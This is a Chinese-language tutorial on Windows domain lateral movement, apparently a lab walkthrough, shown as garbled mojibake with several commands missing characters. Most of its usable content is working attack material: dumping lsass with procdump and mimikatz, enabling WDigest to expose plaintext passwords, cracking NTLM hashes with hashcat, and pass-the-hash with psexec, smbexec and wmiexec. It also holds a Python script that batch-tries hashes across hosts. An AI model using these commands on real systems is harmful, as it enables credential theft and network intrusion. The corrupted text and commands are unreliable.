ä¹Ÿæ˜¯æˆ‘ä»¬webä¸»æœºçš„å¯†ç ã€‚æ¯”å¦‚è¿™ä¸ª192.168.241.32ï¼Œç„¶åæˆ‘ä»¬å»32ä¸»æœºä¸Šçœ‹ä¸€ä¸‹å¯†ç  è™½ç„¶åœ¨æä¾›çš„æ–‡ä»¶ä¸­çœ‹ä¸åˆ°administratorçš„å¯†ç ï¼Œä½†æ˜¯administratorçš„å¯†ç è‚¯å®šå’Œwebä¸»æœºçš„å¯†ç æ˜¯ä¸€æ ·çš„ï¼Œå¹¶ä¸”æˆ‘ä»¬çœ‹åˆ°æ‰§è¡Œçš„whoamiæ˜¯systemæƒé™ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç»§ç»­å¯¹è¿™ä¸ªä¸»æœºè¿›è¡Œä¿¡æ¯æ”¶é›†äº†ï¼Œæ¯”å¦‚mimikatzè·å–ä¿¡æ¯ç­‰æ“ä½œã€‚ç„¶åå°†æ‰€æœ‰æ”¶é›†åˆ°çš„å¯†ç ï¼Œå…¨éƒ¨æ·»åŠ åˆ°æˆ‘ä»¬ä¸Šé¢ä½¿ç”¨çš„å¯†ç å­—å…¸æ–‡ä»¶ä¸­ï¼Œç„¶åå†æ¢æµ‹ã€‚åå¤å¦‚æ­¤ï¼Œå¾ˆæœ‰å¯èƒ½æ‹¿åˆ°åŸŸæ§ä¸»æœºçš„å£ä»¤ä¿¡æ¯ã€‚ æˆ‘ä»¬è·å–åŸŸæ§ä¸»æœºçš„å¸¸è§„æµç¨‹å…¶å®ä¸ä¼šè¿™ä¹ˆå¿«ï¼Œè¿™é‡Œåªæ˜¯ç»™å¤§å®¶æ¼”ç¤ºåŸç†æµç¨‹ï¼Œä¸€èˆ¬éƒ½æ˜¯æ‹¿ä¸‹ä¸€å°å°±ä¿¡æ¯æ”¶é›†ï¼Œé€šè¿‡æ”¶é›†åˆ°çš„ä¿¡æ¯æ¥è·å–å¦å¤–ä¸€å°ï¼Œæ…¢æ…¢çš„å°†ä¸»æœºå…¨éƒ¨æ‹¿ä¸‹ã€‚è¿™å°±æ˜¯æ€è·¯ã€‚ 1-3 smbå’Œwmiåè®®æ¥è¿›è¡Œæ˜æ–‡æˆ–è€…hashä¼ é€’## Windows2012ä»¥ä¸Šç‰ˆæœ¬é»˜è®¤å…³é—­wdigestï¼Œæ”»å‡»è€…æ— æ³•ä»å†…å­˜ä¸­è·å–æ˜æ–‡å¯†ç  ## Windows2012ä»¥ä¸‹ç‰ˆæœ¬å¦‚å®‰è£…KB2871997è¡¥ä¸ï¼ŒåŒæ ·ä¹Ÿä¼šå¯¼è‡´æ— æ³•è·å–æ˜æ–‡å¯†ç  ## ä¸ªäººç³»ç»Ÿï¼Œvistaä¹‹åä¸»è¦æ˜¯win7ã€win10ç­‰ ## é’ˆå¯¹ä»¥ä¸Šæƒ…å†µï¼Œæˆ‘ä»¬æä¾›äº†4ç§æ–¹å¼è§£å†³æ­¤ç±»é—®é¢˜ 1.åˆ©ç”¨å“ˆå¸Œhashä¼ é€’ï¼ˆpthã€ptkç­‰ï¼‰è¿›è¡Œç§»åŠ¨ 2.åˆ©ç”¨å…¶å®ƒæœåŠ¡åè®®ï¼ˆSMBã€WMIç­‰ï¼‰è¿›è¡Œå“ˆå¸Œç§»åŠ¨ 3.åˆ©ç”¨æ³¨å†Œè¡¨æ“ä½œå¼€å¯Wdigest Authå€¼è¿›è¡Œè·å– 4.åˆ©ç”¨å·¥å…·æˆ–ç¬¬ä¸‰æ–¹å¹³å°ï¼ˆHachcatï¼‰è¿›è¡Œç ´è§£è·å– çŸ¥è¯†ç‚¹2ï¼š Windowsç³»ç»ŸLM HashåŠNTLM HashåŠ å¯†ç®—æ³•ï¼Œä¸ªäººç³»ç»Ÿåœ¨Windows vistaåï¼ŒæœåŠ¡å™¨ç³»ç»Ÿåœ¨Windows 2003ä»¥åï¼Œè®¤è¯æ–¹å¼å‡ä¸ºNTLM Hashã€‚ ## æ³¨å†Œè¡¨ä¿®æ”¹å¼€å¯Wdigest Authå€¼ reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest v UseLogonCredential t REG_DWORD d 1 f 3-1 Procdump+Mimikatzé…åˆè·å–å¯†ç ç”±äºmimikatzä¼šè¢«æ€è½¯æ€æ‰ï¼Œæ‰€ä»¥å½“mimikatzè·å–å¤±è´¥æ—¶é…åˆprocdumpè·å–å¯†ç  ## é€šè¿‡procdumpè·å–å¯†ç ï¼Œç”Ÿæˆå‚¨å­˜ç€å¯†ç hashå€¼çš„.dmpæ–‡ä»¶ procdump -accepteula -ma lsass.exe lsass.dmp ## å°†dmpæ–‡ä»¶æ”¾åˆ°mimikatzä¸Šæ‰§è¡Œ sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords full ## é™„ä¸¤æ¬¾æå–å¯†ç çš„è½¯ä»¶ Pwdump7 QuarksPwdump Hashcatç ´è§£è·å–Windows NTML Hash hashcat -a 0 -m 1000 hash file â€“force ## è¯¥å·¥å…·è¿˜æ”¯æŒæ›´å¤šå¯†ç ç ´è§£ é€šè¿‡procdumpè·å–å¯†ç ï¼š äº¤ç»™mimikatzæ¥è§£æ å†æ‰§è¡Œå¦‚ä¸‹æŒ‡ä»¤ sekurlsa::logonPasswords full å¯†ç è·å–æˆåŠŸï¼Œæ€è·¯ï¼šåœ¨ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œprocdumpï¼Œç„¶åå°†lsass.dmpæ–‡ä»¶äº¤ç»™æˆ‘ä»¬çš„æ”»å‡»æœºä¸Šçš„mimikatzæ¥æ‰“å¼€ã€‚ä»¥é˜²mimikatzåœ¨ç›®æ ‡ä¸»æœºä¸Šè¢«æ‹¦æˆªæˆ–è€…ç¦ç”¨æˆ–è€…è¢«æ€æ‰çš„æƒ…å†µã€‚ 3-2 NTML-Hashå¯†ç ç ´è§£ç ´è§£å‰å¯ä»¥ä½¿ç”¨tspkgï¼Œwdigestï¼Œkerberosæ¨¡å—æä¾›çš„å¯†ç è¿›è¡Œå°è¯•ã€‚hashï¼Œè¯‘ä½œå“ˆå¸Œæˆ–è€…æ•£åˆ—ï¼Œæ˜¯æŒ‡å°†ä»»æ„é•¿åº¦çš„è¾“å…¥ï¼Œç»è¿‡æ•£åˆ—ç®—æ³•ç”Ÿæˆå›ºå®šé•¿åº¦çš„å¯†æ–‡ï¼Œä¹Ÿå°±æ˜¯æ•£åˆ—å€¼ã€‚ç›®å‰æ¥è¯´ï¼Œhashå‡½æ•°ä¸»è¦æœ‰MD5ã€SHA1ã€NTLMç­‰ç®—æ³•ã€‚ æ•£åˆ—è¿‡ç¨‹æ˜¯ä¸å¯é€†çš„ï¼Œå¹¶ä¸”å¯èƒ½å­˜åœ¨å¤šä¸ªè¾“å…¥å¯¹åº”ç€åŒä¸€ä¸ªæ•£åˆ—å€¼ï¼ˆå“ˆå¸Œç¢°æ’ï¼‰ã€‚ç ´è§£hashç®—æ³•æœ‰å­—å…¸æ”»å‡»ã€æŸ¥è¡¨æ³•ã€åå‘æŸ¥è¡¨æ³•ã€å½©è™¹è¡¨ç­‰å¤šç§æ–¹å¼ã€‚åœ¨çº¿ç ´è§£ç½‘ç«™æ¨èä½¿ç”¨ï¼šcmd5ã€ophcrack ç¦»çº¿ç ´è§£å·¥å…·æ¨èä½¿ç”¨ï¼šhashcatã€john hashcatçš„å¤§è‡´æŒ‡ä»¤å¦‚ä¸‹ï¼š Hashcatç ´è§£è·å–Windows NTML Hash hashcat -a 0 -m 1000 hash file â€“force ## è¯¥å·¥å…·è¿˜æ”¯æŒæ›´å¤šå¯†ç ç ´è§£ ä¹Ÿå°±æ˜¯æˆ‘ä»¬é€šè¿‡procdumpæ‹¿åˆ°çš„hashå¯†ç ï¼Œå¯ä»¥é€šè¿‡hashcatæ¥çˆ†ç ´ï¼Œä¸ä¸€å®šèƒ½å¤Ÿçˆ†ç ´å‡ºæ¥ï¼Œä½†æ˜¯æ¦‚ç‡å¾ˆå¤§ã€‚ æˆ‘è¿™é‡Œæ²¡æœ‰å®‰è£…è¿™ä¸ªå·¥å…·ï¼Œå¤§å®¶çœ‹ä¸€çœ‹å³å¯https://www.freebuf.com/sectool/164507.html 3-3 smbåè®®ä¼ é€’## åŸŸæ¨ªå‘ç§»åŠ¨SMBæœåŠ¡åˆ©ç”¨ psexecã€smbexecï¼ˆå®˜æ–¹è‡ªå¸¦ï¼‰ ## åˆ©ç”¨SMBæœåŠ¡å¯ä»¥é€šè¿‡æ˜æ–‡æˆ–hashä¼ é€’æ¥è¿œç¨‹æ‰§è¡Œï¼Œæ¡ä»¶445æœåŠ¡ç«¯å£å¼€æ”¾ã€‚ ## psexecç¬¬ä¸€ç§ï¼šå…ˆæœ‰ipcé“¾æ¥ï¼Œpsexecéœ€è¦æ˜æ–‡æˆ–hashä¼ é€’ï¼Œæ³¨æ„ï¼šæœ¬åœ°å’ŒåŸŸç”¨æˆ·å†™æ³•ä¸åŒ ## éœ€è¦å…ˆæœ‰ipcé“¾æ¥ï¼Œ-sä»¥Systemæƒé™è¿è¡Œ net use \\[IP]\\ipc$â€[å¯†ç ]â€ user:[ç”¨æˆ·å] net use \\192.168.241.32\\ipc$ â€œadmin!@#45â€ user:administrator psexec \\[IP] -s cmd psexec \\192.168.241.32 -s cmd ## psexecç¬¬äºŒç§ï¼šä¸ç”¨å»ºç«‹IPCç›´æ¥æä¾›æ˜æ–‡è´¦æˆ·å¯†ç  psexec \\[IP] -u [ç”¨æˆ·å] -p [å¯†ç ] -s cmd psexec \\192.168.241.21 -u administrator -p Admin12345 -s cmd psexec -hashes :[å¯†ç çš„hashå€¼] .[ç”¨æˆ·å]@[IP] psexec -hashes :$HASH$ .administrator@10.1.2.3 psexec -hashes :[å¯†ç çš„hashå€¼] [åŸŸå][ç”¨æˆ·å]@[IP] psexec -hashes :$HASH$ domainadministrator@10.1.2.3 ## å®˜æ–¹Pstoolsæ— æ³•é‡‡ç”¨hashè¿æ¥ï¼Œå¯ä»¥ä½¿ç”¨impacketå·¥å…·åŒ…ï¼Œæ“ä½œç®€å•ï¼Œä½†æ˜¯å®¹æ˜“è¢«æ€ **3-1 psexec** psexecæ˜¯windowså®˜æ–¹æä¾›çš„å·¥å…·ï¼Œpsexecä½¿ç”¨çš„æ—¶å€™æœ‰ä¸¤ç§æ–¹æ³•ï¼Œæ¨èç¬¬äºŒç§ï¼Œå› ä¸ºç¬¬äºŒç§ä¸éœ€è¦å»ºç«‹ipcè¿æ¥ã€‚ç¬¬ä¸€ç§æ–¹æ³•éœ€è¦å»ºç«‹è¿æ¥ï¼Œé‚£ä¹ˆå¯èƒ½ä¼šå‡ºç°æ— æ³•å»ºç«‹ipcè¿æ¥çš„é—®é¢˜ã€‚ä¸ç®¡æ˜¯ç¬¬ä¸€ç§è¿˜æ˜¯ç¬¬äºŒç§ï¼Œéƒ½æ”¯æŒhashå€¼ä¼ é€’ã€‚å®˜æ–¹çš„pstoolsæ˜¯ä¸èƒ½é€šè¿‡hashå€¼æ¥è¿æ¥çš„ã€‚ å®˜ç½‘ï¼šhttps://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools**æ–¹å¼1ï¼šéœ€è¦å»ºç«‹ipcè¿æ¥** æ³¨æ„ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œä¹Ÿå°±æ˜¯è¯´ä»¥ç›®æ ‡ä¸»æœºçš„ç®¡ç†å‘˜ç”¨æˆ·æ¥å»ºç«‹ipcè¿æ¥æ‰å¯ä»¥ å…ˆä½¿ç”¨æ™®é€šåŸŸç”¨æˆ·æ¥å»ºç«‹ipcè¿æ¥ æ‰§è¡Œå¤±è´¥ æ‰§è¡Œpsexecè¿™ä¸ªæŒ‡ä»¤çš„æ—¶å€™å¯èƒ½ä¼šæç¤ºå¦‚ä¸‹ä¿¡æ¯ï¼Œç‚¹å‡»agreeå³å¯ åœ¨ä½¿ç”¨æœ¬åœ°çš„ç®¡ç†å‘˜ç”¨æˆ·å»ºç«‹è¿æ¥ï¼Œå»ºç«‹æˆåŠŸï¼Œæ‹¿åˆ°äº†åå¼¹çš„shell æŸ¥çœ‹ä¸€ä¸‹ç›®æ ‡ip ç„¶åçœ‹ç¬¬äºŒç§æ–¹æ³•ï¼Œå…ˆçœ‹æ˜æ–‡çš„ï¼šä¸éœ€è¦å»ºç«‹è¿æ¥ **æ–¹å¼2ï¼šä¸éœ€è¦å»ºç«‹ipcè¿æ¥(æ¨è)** æ¯”å¦‚æˆ‘ä»¬ç›´æ¥ç”¨è·å–åˆ°çš„ç”¨æˆ·åå’Œå¯†ç å»è¿æ¥ä¸€ä¸‹åŸŸæ§ä¸»æœº æ˜æ–‡å¯†ç ä¼ é€’è·å–shell hashå¯†ç ä¼ é€’è·å–shell **å…ˆå¯¼å‡ºmimikatzçš„ç»“æœ** mimikatz.exe â€œprivilege::debugâ€ â€œsekurlsa::logonpasswordsâ€ pssword.txt æ‰¾åˆ°hashå¯†ç  å¥½ï¼Œå¯¹sqlserverä¸»æœºè¿›è¡Œhashä¼ é€’ psexec -hashes :518b98ad4178a53695dc997aa02d455c .administrator@192.168.241.32 ç»“æœå¦‚ä¸‹ï¼ŒæŠ¥é”™ å› ä¸ºå®˜æ–¹æä¾›çš„psexecåªæ”¯æŒæ˜æ–‡å¯†ç ä¼ é€’ï¼Œå¦‚æœæƒ³è¿›è¡Œhashä¼ é€’ä¹Ÿæ˜¯æœ‰åŠæ³•çš„ï¼Œæˆ‘ä»¬ä¸éœ€è¦è‡ªå·±æäº†ï¼Œæœ‰ä¸€äº›ç½‘ä¸Šåˆ«äººå¯¹å®˜æ–¹psexecè¿›è¡ŒäºŒæ¬¡å¼€å‘çš„å·¥å…·ï¼Œå¯ä»¥æ”¯æŒhashä¼ é€’ï¼Œæ¯”å¦‚ç¬¬ä¸‰æ–¹å·¥å…·åŒ…impacketï¼Œæˆ‘ä»¬åœ¨å‰é¢ä¿¡æ¯æ”¶é›†ä¸­ç”¨åˆ°è¿‡atexec-impacketï¼Œæ¥ä¸‹æ¥æ˜¯psexec-impacket ä½†æ˜¯è¿è¡Œæ—¶å¯èƒ½ä¼šæŠ¥é”™ï¼Œç¼–ç é—®é¢˜ï¼Œå› ä¸ºç›®æ ‡ä¸»æœºæ˜¯gbkç¼–ç ï¼Œç°åœ¨è¿™ä¸ªcmdçª—å£æ˜¯utf8çš„ è°ƒæ•´cmdç¼–ç  CMD ä½¿ç”¨å‘½ä»¤ chcp å¯ä»¥æŸ¥çœ‹åˆ°å½“å‰ç¼–ç ï¼Œå³é”®å±æ€§ä¹Ÿå¯æŸ¥çœ‹å½“å‰cmdä½¿ç”¨çš„ç¼–ç æ ¼å¼ GBKçš„ä»£ç ä¸º936 UTF-8çš„ä»£ç ä¸º65001 æ›´æ”¹çš„è¯ cmd è¾“å…¥ä»¥ä¸‹å‘½ä»¤å³å¯ chcp 936 å†æ¬¡æ‰§è¡Œï¼Œæ•ˆæœå¦‚ä¸‹ æˆåŠŸæ‹¿åˆ°äº†shellã€‚ 3-2 smbexec è¿™ä¸ªå·¥å…·åªæœ‰ç¬¬ä¸‰æ–¹çš„äº†ï¼Œå®˜æ–¹æ²¡æœ‰ã€‚ ## smbexecæ— éœ€å…ˆipcé“¾æ¥æ˜æ–‡æˆ–hashä¼ é€’ smbexec [åŸŸå][ç”¨æˆ·å]:[å¯†ç ]@[IP] smbexec godadministrator:Admin12345@192.168.241.21 smbexec .[ç”¨æˆ·å]:[å¯†ç ]@[IP] smbexec .administrator:admin!@#45@192.168.241.32 smbexec -hashes :[å¯†ç çš„hashå€¼] .[ç”¨æˆ·å]@[IP] smbexec -hashes :$HASH$ .admin@192.168.241.21 # 518b98ad4178a53695dc997aa02d455c æ¯”å¦‚ï¼š smbexec -hashes :518b98ad4178a53695dc997aa02d455c .admin@192.168.241.21 smbexec -hashes :[å¯†ç çš„hashå€¼] [åŸŸå][ç”¨æˆ·å]@[IP] smbexec -hashes :$HASH$ domainadmin@192.168.241.21 æ¯”å¦‚ï¼š smbexec -hashes :518b98ad4178a53695dc997aa02d455c domainadmin@192.168.241.21 æ˜æ–‡ä¼ é€’ ç”¨webservserä¸»æœºçš„æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·è¿æ¥ä¸€ä¸‹åŸŸæ§ä¸»æœºè¯•è¯•ï¼Œä½¿ç”¨åŸŸæ§çš„åŸŸç®¡ç†å‘˜ç”¨æˆ·è¿æ¥ï¼Œè¿æ¥æˆåŠŸ ä½¿ç”¨SqlServerä¸»æœºçš„æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·è¿æ¥ä¸€ä¸‹sqlserverä¸»æœº hashä¼ é€’ å…ˆé€šè¿‡mimikatzæ‹¿åˆ°å¯†æ–‡å¯†ç ï¼Œå°±æ˜¯é‚£ä¸ªNTLMï¼Œå¹¶ä¸”ä¸‹é¢å¯ä»¥çœ‹åˆ°æ˜æ–‡å¯†ç admin!@#45ï¼Œç„¶åæˆ‘ä»¬çœ‹åˆ°windows server 2012è¿™ä¸ªä¸»æœºçš„ç”¨æˆ·åå’Œå¯†ç ï¼Œä¹Ÿæ˜¯è¿™ä¸ªå¯†ç ã€‚ç„¶åçœ‹ä¸€ä¸‹maryè¿™ä¸ªä¸ªäººç”µè„‘çš„å¯†ç ï¼Œæ˜æ–‡å¯†ç å’Œä¸Šé¢çš„ç›¸åŒï¼Œé‚£ä¹ˆå¯†æ–‡å¯†ç ä¹Ÿå°±æ˜¯ç›¸åŒã€‚å¥½ï¼Œç„¶åæˆ‘ä»¬é€šè¿‡hashå€¼æ¥è¿æ¥ä¸€ä¸‹sqlserveré‚£ä¸ªä¸»æœºï¼š ä¼ é€’æˆåŠŸ 3-4 wmiæœåŠ¡åè®®ä¼ é€’wmiæœåŠ¡æ˜¯æ¯”smbæœåŠ¡é«˜çº§ä¸€äº›çš„ï¼Œåœ¨æ—¥å¿—ä¸­æ˜¯æ‰¾ä¸åˆ°ç—•è¿¹çš„ï¼Œä½†æ˜¯è¿™ä¸ªä¸»è¦æ˜¯ä¼ é€’çš„ç®¡ç†å‘˜ç”¨æˆ·å‡­æ®ã€‚ ## åŸŸæ¨ªå‘ç§»åŠ¨WMIæœåŠ¡åˆ©ç”¨ cscriptã€wmiexecã€wmic ## WMI(Windows Management Instrumentation)æ˜¯é€šè¿‡135ç«¯å£è¿›è¡Œåˆ©ç”¨ï¼Œæ”¯æŒç”¨æˆ·åæ˜æ–‡æˆ–è€…hashçš„æ–¹å¼è¿›è¡Œè®¤è¯ï¼Œå¹¶ä¸”è¯¥æ–¹æ³•ä¸ä¼šåœ¨ç›®æ ‡æ—¥å¿—ç³»ç»Ÿç•™ä¸‹ç—•è¿¹ã€‚ ## è‡ªå¸¦WMICæ˜æ–‡ä¼ é€’ï¼Œæ— å›æ˜¾ wmic node:[IP] user:[ç”¨æˆ·å] password:[å¯†ç ] process call create â€œ[å‘½ä»¤]â€ wmic node:192.168.241.21 user:administrator password:Admin12345 process call create â€œcmd.exe c ipconfig C:\\1.txtâ€ ## ï¼ˆè¿è¡Œcmdï¼Œæ‰§è¡Œipconfigå¹¶å°†ç»“æœè¾“å‡ºåˆ°Cç›˜ä¸‹çš„1.txtä¸­ï¼‰ï¼Œéœ€è¦å¯¼å‡ºåˆ°æŸä¸ªæ–‡ä»¶ä¸­ï¼Œç„¶åå†è¯»å–æ–‡ä»¶æ•°æ®è‡ªå¸¦cscriptæ˜æ–‡ä¼ é€’ï¼Œæœ‰å›æ˜¾ï¼Œéœ€è¦ä¸‹è½½wmiexec.vbsé…åˆ cscript nologo wmiexec.vbs shell [IP] [ç”¨æˆ·å] [å¯†ç ] cscript nologo wmiexec.vbs shell 192.168.241.21 administrator Admin12345 #ä¼šåå¼¹ä¸€ä¸ªshell ## å¥—ä»¶impacket wmiexecæ˜æ–‡æˆ–hashä¼ é€’ï¼Œæœ‰å›æ˜¾exeç‰ˆæœ¬ï¼Œå¯èƒ½è¢«æ€ wmiexec .[ç”¨æˆ·å]:[å¯†ç ]@[IP] â€œ[å‘½ä»¤]â€ wmiexec .administrator:admin!@#45@192.168.241.32 â€œwhoamiâ€ wmiexec [åŸŸå][ç”¨æˆ·å]:[å¯†ç ]@[IP] â€œ[å‘½ä»¤]â€ wmiexec godadministrator:Admin12345@192.168.241.21 â€œwhoamiâ€ wmiexec -hashes :[å¯†ç çš„hashå€¼] .[ç”¨æˆ·å]:[å¯†ç ]@[IP] â€œ[å‘½ä»¤]â€ wmiexec -hashes :518b98ad4178a53695dc997aa02d455c .administrator@192.168.241.32 â€œwhoamiâ€ wmiexec -hashes :[å¯†ç çš„hashå€¼] [åŸŸå][ç”¨æˆ·å]:[å¯†ç ]@[IP] â€œ[å‘½ä»¤]â€ wmiexec -hashes :518b98ad4178a53695dc997aa02d455c godadministrator@192.168.241.21 â€œwhoamiâ€ æ–¹å¼1ï¼šç³»ç»Ÿè‡ªå¸¦çš„wmicå·¥å…· è‡ªå¸¦çš„wmicç¤ºä¾‹ï¼Œä¸éœ€è¦è€ƒè™‘å…æ€é—®é¢˜ã€‚ wmic node:192.168.241.21 user:administrator password:Admin12345 process call create â€œcmd.exe c ipconfig C:\\1.txtâ€ ç›®æ ‡ä¸»æœºä¸Šå¤šäº†1.txtæ–‡ä»¶ æ–¹å¼2ï¼šç³»ç»Ÿè‡ªå¸¦å·¥å…·cscript cscriptï¼Œä¹Ÿæ˜¯ç³»ç»Ÿè‡ªå¸¦çš„å·¥å…·ï¼Œå¹¶ä¸”æœ‰å›æ˜¾ï¼Œç›´æ¥ä¼šåå¼¹ä¸€ä¸ªshellå›æ¥ï¼Œä½†æ˜¯éœ€è¦å€ŸåŠ©åˆ°wmiexec.vbs æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶åœ¨æˆ‘çš„ç™¾åº¦ç½‘ç›˜è¿æ¥ä¸­å°±æœ‰ã€‚ cscript nologo wmiexec.vbs shell 192.168.241.21 administrator Admin12345 æ–¹å¼3ï¼šç¬¬ä¸‰æ–¹å·¥å…·åŒ… å¦‚æœæœ‰æ€è½¯ï¼Œéœ€è¦åšå…æ€ã€‚æ”¯æŒæ˜æ–‡å’Œhashä¸¤ç§æ–¹å¼çš„wmiä¼ é€’æ”»å‡»ã€‚ æœ¬åœ°ç”¨æˆ· wmiexec .administrator:admin!@#45@192.168.241.32 â€œwhoamiâ€ wmiexec -hashes :518b98ad4178a53695dc997aa02d455c .administrator@192.168.241.32 â€œwhoamiâ€ åŸŸç”¨æˆ· wmiexec godadministrator:Admin12345@192.168.241.21 â€œwhoamiâ€ wmiexec -hashes :åŸŸæ§çš„hashå¯†ç  godadministrator@192.168.241.21 â€œwhoamiâ€ æ˜æ–‡æ•ˆæœ ä¼ é€’æ”»å‡»sqlserverå’ŒåŸŸæ§ä¸»æœº hashå¯†ç  ä¼ é€’æ”»å‡»sqlserveä¸»æœº æ€»ç»“ï¼š 3-5 æ‰¹é‡æ£€æµ‹æ¨ªå‘æ¸—é€æ˜æ–‡HASHä¼ é€’æ‰¹é‡åˆ©ç”¨-å‡çº§ç‰ˆ åˆ©ç”¨pyè„šæœ¬åˆ¶ä½œçš„exeæ–‡ä»¶æ‰¹é‡å°è¯•æ¨ªå‘æ¸—é€ å°†pythonè„šæœ¬ç¼–è¯‘æˆexeæ–‡ä»¶ å®‰è£…pyinstaller pip install pyinstaller ç”Ÿæˆå¯æ‰§è¡ŒEXE Pyinstaller -F [.pyæ–‡ä»¶] ä¼šç”Ÿæˆä¸€ä¸ªåŒåçš„exeæ–‡ä»¶ ä»£ç å¦‚ä¸‹ï¼š import os,time ips{ â€˜192.168.241.21â€™, â€˜192.168.241.25â€™, â€˜192.168.241.29â€™, â€˜192.168.241.30â€™, â€˜192.168.241.31â€™, â€˜192.168.241.33â€™ } users{ â€˜administratorâ€™, â€˜bossâ€™, â€˜dbadminâ€™, â€˜fileadminâ€™, â€˜mackâ€™, â€˜maryâ€™, â€˜vpnadmâ€™, â€˜webadminâ€™ } hashs{ â€˜518b98ad4178a53695dc997aa02d455câ€™, â€˜hash2â€™, â€˜hash3â€™ } for ip in ips: for user in users: for mimahash in hashs: execâ€wmiexec -hashes :â€+mimahash+â€ godâ€œ+user+â€@â€+ip+â€ whoamiâ€ exec1â€wmiexec -hashes :â€+mimahash+â€ .â€œ+user+â€@â€+ip+â€ whoamiâ€ print(â€˜â€™,exec,â€™â€™) print(â€˜â€™,exec1,â€™â€™) os.system(exec) os.system(exec1) time.sleep(0.5) åŒæ ·ï¼Œå¯ä»¥ç”Ÿæˆexeç¨‹åºï¼Œæ”¾åˆ°ç›®æ ‡ä¸»æœºä¸Šè¿è¡Œï¼Œè¿™é‡Œæˆ‘å°±ä¸æ¼”ç¤ºäº†ã€‚ 1-9-2 ç¥¨æ®ä¼ é€’2-1 æ¦‚å¿µè§£æ1-1 SAMåè®®## æœåŠ¡å™¨æ¶ˆæ¯å—ï¼ˆServer Message Blockï¼Œç¼©å†™ä¸ºSMBï¼‰ï¼Œåˆç§°ç½‘ç»œæ–‡ä»¶å…±äº«ç³»ç»Ÿï¼ˆCommon Internet File Systemï¼Œç¼©å†™ä¸ºCIFSï¼Œå…¶å®ä»–æ˜¯å‡çº§ç‰ˆçš„SAMåè®®ï¼‰ï¼Œä¸€ç§åº”ç”¨å±‚ç½‘ç»œä¼ è¾“åè®®ï¼Œç”±å¾®è½¯å¼€å‘ï¼Œä¸»è¦åŠŸèƒ½æ˜¯ä½¿ç½‘ç»œä¸Šçš„æœºå™¨èƒ½å¤Ÿå…±äº«è®¡ç®—æœºæ–‡ä»¶ã€æ‰“å°æœºã€ä¸²è¡Œç«¯å£å’Œé€šè®¯ç­‰èµ„æºã€‚å®ƒä¹Ÿæä¾›ç»è®¤è¯çš„è¡Œç¨‹é—´é€šä¿¡æœºèƒ½ã€‚SMB æ˜¯åœ¨ä¼šè¯å±‚ï¼ˆsession layerï¼‰å’Œè¡¨ç¤ºå±‚ï¼ˆpresentation layerï¼‰ä»¥åŠå°éƒ¨åˆ†åº”ç”¨å±‚ï¼ˆapplication layerï¼‰çš„åè®®ã€‚SMBä½¿ç”¨äº†NetBIOSçš„åº”ç”¨ç¨‹åºæ¥å£ ï¼ˆApplication Program Interfaceï¼Œç®€ç§°APIï¼‰ã€‚å¦å¤–ï¼Œå®ƒæ˜¯ä¸€ä¸ªå¼€æ”¾æ€§çš„åè®®ï¼Œå…è®¸äº†åè®®æ‰©å±•â€”â€”ä½¿å¾—å®ƒå˜å¾—æ›´å¤§è€Œä¸”å¤æ‚ï¼ŒSMBåè®®æ˜¯åŸºäºTCPï¼NETBIOSä¸‹çš„ï¼Œä¸€èˆ¬ç«¯å£ä½¿ç”¨ä¸º139ï¼Œ445ã€‚ ## å®‰å…¨å¸æˆ·ç®¡ç†å™¨ï¼ˆSecurity Accounts Managerï¼‰ï¼Œä¹Ÿå«åšSAMæ•°æ®åº“, SAM æ˜¯Windowsæ“ä½œç³»ç»Ÿç®¡ç†ç”¨æˆ·å¸æˆ·çš„å®‰å…¨æ‰€ä½¿ç”¨çš„ä¸€ç§æœºåˆ¶ã€‚ç”¨æ¥å­˜å‚¨ Windows æ“ä½œç³»ç»Ÿå¯†ç çš„æ•°æ®åº“æ–‡ä»¶ï¼Œä¸ºäº†é¿å…æ˜æ–‡å¯†ç æ³„æ¼SAMæ–‡ä»¶ä¸­ä¿å­˜çš„æ˜¯æ˜æ–‡å¯†ç åœ¨ç»è¿‡ä¸€ç³»åˆ—ç®—æ³•å¤„ç†è¿‡çš„Hashå€¼è¢«ä¿å­˜çš„Hashåˆ†ä¸ºLMHashã€NTLMHashã€‚å½“ç”¨æˆ·è¿›è¡Œèº«ä»½è®¤è¯æ—¶ä¼šå°†è¾“å…¥çš„Hashå€¼ä¸SAMæ–‡ä»¶ä¸­ä¿å­˜çš„Hashå€¼è¿›è¡Œå¯¹æ¯”ã€‚ ## SAMæ–‡ä»¶ä¿å­˜äº %SystemRoot%\\system32\\config\\sam ä¸­ï¼Œåœ¨æ³¨å†Œè¡¨ä¸­ä¿å­˜åœ¨ HKEY_LOCAL_MACHINE\\SAM\\SAMï¼ŒHKEY_ LOCAL _MACHINE\\SECURITY\\SAM ã€‚åœ¨æ­£å¸¸æƒ…å†µä¸‹SAMæ–‡ä»¶å¤„äºé”å®šçŠ¶æ€ä¸å¯ç›´æ¥è®¿é—®ã€å¤åˆ¶ã€ç§»åŠ¨ï¼Œä»…æœ‰systemç”¨æˆ·æƒé™æ‰å¯ä»¥è¯»å†™è¯¥æ–‡ä»¶ã€‚ 1-2 Sambaåè®®## Sambaåè®®æ˜¯Unixç³»ç»Ÿä¸‹å®ç°çš„ 